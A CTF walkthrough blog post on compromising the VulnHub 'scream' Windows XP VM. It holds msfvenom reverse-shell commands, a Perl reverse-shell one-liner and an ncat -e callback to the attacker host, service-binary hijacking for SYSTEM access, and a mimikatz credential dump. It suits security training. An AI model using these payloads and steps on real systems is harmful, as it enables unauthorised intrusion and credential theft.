---
layout: post
title: "/dev/random: scream CTF Walkthrough"
date: 2017-08-20
categories:
  - security
  - ctf
  - walkthrough
tags:
  - /dev/random
  - vulnhub
excerpt: The version of `war-ftpd` that was running seemed to be vulnerable to a buffer overflow (http://www.securityfocus.com/bid/22944/info), but some manual attempts at causing the overflow were unsuccessful; suggesting this may actually be patched or a misidentification.
---
```
  _________                                    
 /   _____/ ___________   ____ _____    _____  
 \_____  \_/ ___\_  __ \_/ __ \\__  \  /     \
 /        \  \___|  | \/\  ___/ / __ \|  Y Y  \
/_______  /\___  >__|    \___  >____  /__|_|  / .VM.
        \/     \/            \/     \/      \/
----------------------------------------------------------------------------
|  cReaTeD....: sagi-                |  DaTe......: 12-11-10               |
|  oS.........: Windows XP Home/Pro  |  oBJecTiVe.: Get the local user's   |
|               SP2/3 x86            |              password               |
|  iNSTaLLeR..: g0tmi1k              |  GReeTZ....: #vulnhub               |
----------------------------------------------------------------------------
```

## Service Discovery
A top 1000 scan using Nmap [`nmap -sS -sV -sC 10.2.0.107`] revealed four services running on the VM:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     WAR-FTPD 1.65 (Name Scream XP (SP2) FTP Service)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 1 ftp ftp              0 Aug 19 15:50 bin
| drwxr-xr-x 1 ftp ftp              0 Aug 19 15:53 log
|_drwxr-xr-x 1 ftp ftp              0 Aug 19 15:50 root
|_ftp-bounce: bounce working!
22/tcp open  ssh     WeOnlyDo sshd 2.1.3 (protocol 2.0)
| ssh-hostkey:
|   1024 2c:23:77:67:d3:e0:ae:2a:a8:01:a4:9e:54:97:db:2c (DSA)
|_  1024 fa:11:a5:3d:63:95:4a:ae:3e:16:49:2f:bb:4b:f1:de (RSA)
23/tcp open  telnet
80/tcp open  http    Tinyweb httpd 1.93
|_http-server-header: TinyWeb/1.93
|_http-title: The Scream - Edvard Munch
```

The version of `war-ftpd` that was running seemed to be vulnerable to a buffer overflow ([http://www.securityfocus.com/bid/22944/info](http://www.securityfocus.com/bid/22944/info)), but some manual attempts at causing the overflow were unsuccessful; suggesting this may actually be patched or a misidentification.

As the FTP server was accepting anonymous connections, I connected and began to take a look around. Although I didn't have any write permissions, I did find an interestingly named file in the `/log` directory, which suggested a TFTP service could be running:

```shell_session
ftp> cd log
250 CWD successful. "/log" is current directory.
ftp> dir
200 Port command successful
150 Opening data channel for directory list.
---------- 1 ftp ftp           2912 Aug 19 18:23 access_log
---------- 1 ftp ftp           1449 Aug 19 18:23 agent_log
---------- 1 ftp ftp              0 Aug 19 15:53 error_log
---------- 1 ftp ftp            674 Nov 01  2012 OpenTFTPServerMT.log
---------- 1 ftp ftp             35 Aug 19 18:22 referer_log
226 Transfer OK
```

With this in mind, I did a quick test to see if I could transfer a file via tftp:

```shell_session
root@kali:~# tftp 10.2.0.107
tftp> status
Connected to 10.2.0.107.
Mode: netascii Verbose: off Tracing: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> put ssp.c
Sent 9785 bytes in 0.0 seconds
```

As the file transferred successfully, I connected back to the FTP server, to see if the TFTP server was serving one of the same directories, and managed to find my file in the `/root` directory; which was also seemingly the root directory of the web server:

```shell_session
ftp> cd root
250 CWD successful. "/root" is current directory.
ftp> dir
200 Port command successful
150 Opening data channel for directory list.
drwxr-xr-x 1 ftp ftp              0 Feb 08  2013 cgi-bin
---------- 1 ftp ftp          14539 Oct 31  2012 index.html
---------- 1 ftp ftp          10161 Aug 19 19:39 ssp.c
226 Transfer OK
```

## Exploiting TFTP
As the TFTP service was pointing directly at the web root, I used `msfvenom` to create a reverse TCP executable, which I could place in the `cgi-bin` directory:

```shell_session
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.2.0.3 LPORT=4444 -f exe -o shell.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

I then transferred it, ensuring to set the transfer mode to `binary`:

```shell_session
tftp> binary
tftp> mode
Using octet mode to transfer files.
tftp> put shell.exe cgi-bin/shell.exe
Sent 73802 bytes in 0.1 seconds
```

I then started a handler to catch the shell with:

```shell_session
root@kali:~# ncat -v -l -p 4444
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

And then attempted to invoke the executable by using curl to access `/cgi-bin/shell.exe`; but unfortunately it returned an error.

As native executables were out of the question, I tried another reverse TCP payload, but this time using Perl:

```shell_session
root@kali:~# msfvenom -p cmd/windows/reverse_perl LHOST=10.2.0.3 LPORT=4444 -o shell.pl
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: cmd from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 141 bytes
Saved as: shell.pl
```

There were a few changes I needed to make to `shell.pl` first, as the payload tries to invoke Perl with an inline script; where as I just wanted the script, so I removed `perl -MIO -e`, the quotes surrounding the script and the back slashes escaping the IP address / port.

In addition to this, I also had to load the `IO::Socket::INET` module. The payload after my modifications was:

```perl
use IO::Socket::INET;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.2.0.3:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;
```

Now, using the same transport method as before, I was able to upload the Perl script to `cgi-bin/shell.pl` and when invoking it by accessing `/cgi-bin/shell.pl` using curl, the handler caught the connection and allowed me to start firing commands:

```shell_session
Ncat: Connection from 10.2.0.107.
Ncat: Connection from 10.2.0.107:1085.
dir
 Volume in drive C has no label.
 Volume Serial Number is 1089-0B4E

 Directory of c:\www\root\cgi-bin

08/19/2017  08:02 PM    <DIR>          .
08/19/2017  08:02 PM    <DIR>          ..
08/19/2017  07:45 PM            74,743 shell.exe
08/19/2017  07:55 PM               141 shell.pl
08/19/2017  07:58 PM               129 shell2.pl
08/19/2017  07:58 PM               127 shell3.pl
08/19/2017  08:00 PM               138 shell4.pl
08/19/2017  08:02 PM               148 shell5.pl
               6 File(s)         75,426 bytes
               2 Dir(s)   7,812,980,736 bytes free
```

## Upgrading Shell to NT AUTHORITY\SYSTEM
As the Perl script I had uploaded was simply shelling commands and provided no interactive functionality, the first thing I did was use TFTP again to transfer a copy of [ncat](https://nmap.org/ncat/) onto the system.

Once transferred, I started up a second handler on port 5555 and used ncat to establish a second session, by running `ncat.exe -e cmd.exe 10.2.0.3 5555`.

Now that I had an interactive shell, I began to do some recon to see how I could escalate to the SYSTEM account, as my current shell was running as the user `alex`.

A look at the current process list revealed there were three services running as SYSTEM, which could potentially be hijacked:

```shell_session
c:\www\root\cgi-bin>tasklist /FI "username eq SYSTEM"
tasklist /FI "username eq SYSTEM"

Image Name                   PID Session Name     Session#    Mem Usage
========================= ====== ================ ======== ============
***
FileZilla server.exe         544 Console                 0      3,032 K
FreeSSHDService.exe          616 Console                 0      8,380 K
OpenTFTPServerMT.exe         956 Console                 0      1,864 K
***
```

Next, I took a look at the list of running services, and was able to identify the service names of these three processes:

```shell_session
c:\www\root\cgi-bin>net start
net start
These Windows services are started:

***
   FileZilla Server FTP server
   FreeSSHDService
***
   Open TFTP Server, MultiThreaded
***

The command completed successfully.
```

As I was using the TFTP service to transport files, I attempted to stop the FileZilla service instead, which I was successfully able to do:

```shell_session
C:\Program Files\FileZilla Server>net stop "FileZilla Server FTP Server"
net stop "FileZilla Server FTP Server"
The FileZilla Server FTP server service is stopping.
The FileZilla Server FTP server service was stopped successfully.
```

Once the service had been stopped, I checked to see if the user I was logged in as was able to rename the service's target executable, and as expected - it could!

```shell_session
C:\Program Files\FileZilla Server>move "FileZilla server.exe" "FileZilla server.exe.bak"
move "FileZilla server.exe" "FileZilla server.exe.bak"
```

Now that I could hijack the service, I created another `windows/shell_reverse_tcp` executable using msfvenom, as I did earlier, but this time set `LPORT` to 5556:

```shell_session
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.2.0.3 LPORT=5556 -f exe -o shell.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

Once created, I transferred it down using TFTP again, and started another ncat listener, but this time on port 5556.

I then proceeded to move the file from the web root into the FileZilla directory, ensuring to rename the file to what the service was targeting and then restarted the service:

```shell_session
C:\PROGRA~1\FILEZI~1>move C:\www\root\shell.exe "FileZilla server.exe"
move C:\www\root\shell.exe "FileZilla server.exe"

C:\PROGRA~1\FILEZI~1>net start "FileZilla Server FTP Server"
net start "FileZilla Server FTP Server"
```

Once the service started back up, the new shell popped:

```shell_session
root@kali:~# ncat -v -l -p 5556
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5556
Ncat: Listening on 0.0.0.0:5556
Ncat: Connection from 10.2.0.107.
Ncat: Connection from 10.2.0.107:1163.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

Initially, I tried to verify this was indeed the SYSTEM account by echoing the `%USERNAME%` var, but it wasn't set (first time I have seen that happen); so I started up a new instance of notepad and then used `tasklist` to verify the owner of the process:

```shell_session
C:\WINDOWS\system32>echo %username%
echo %username%
%username%

C:\WINDOWS\system32>tasklist /v | find "notepad.exe"
tasklist /v | find "notepad.exe"
notepad.exe  3776  Console  0  2,624 K  Running  NT AUTHORITY\SYSTEM  0:00:00 Untitled - Notepad  
```

## Getting The Local User Password
The final step was to recover the local user's password. Using TFTP, again, I transferred a copy of [mimikatz](https://github.com/gentilkiwi/mimikatz) on to the system, which I was able to use to grab the password for the `alex` account and finish the challenge:

```shell_session
C:\www\root>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.1.1 (x86) built on Aug 13 2017 17:27:38
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 21 modules * * */

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 37308 (00000000:000091bc)
Session           : Interactive from 0
User Name         : alex
Domain            : SCREAM
Logon Server      : SCREAM
Logon Time        : 8/19/2017 5:06:49 PM
SID               : S-1-5-21-1417001333-484763869-682003330-1003
	msv :
	 [00000002] Primary
	 * Username : alex
	 * Domain   : SCREAM
	 * NTLM     : 504182f8417ed8557b67e96adc8b4d04
	 * SHA1     : c84389be8e78f275c4530b00ba54aea1cbd347f7
	wdigest :
	 * Username : alex
	 * Domain   : SCREAM
	 * Password : thisisaverylongpassword
	kerberos :
	 * Username : alex
	 * Domain   : SCREAM
	 * Password : thisisaverylongpassword
```
